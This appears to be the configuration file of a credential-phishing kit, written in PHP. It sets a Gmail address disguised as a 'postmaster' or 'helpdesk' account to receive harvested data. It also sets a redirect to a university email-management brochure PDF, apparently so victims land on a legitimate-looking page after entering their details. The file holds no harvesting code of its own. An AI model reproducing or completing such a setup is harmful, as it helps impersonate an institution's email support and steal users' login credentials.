<?php
//Your email
$to = 'postmaster.noreply.helpdesk@gmail.com';

#Your redirect link
$redirect = 'https://www.canterbury.ac.nz/irm/documents/VCOF3004_Email_Management_A5_Brochure.pdf';

?>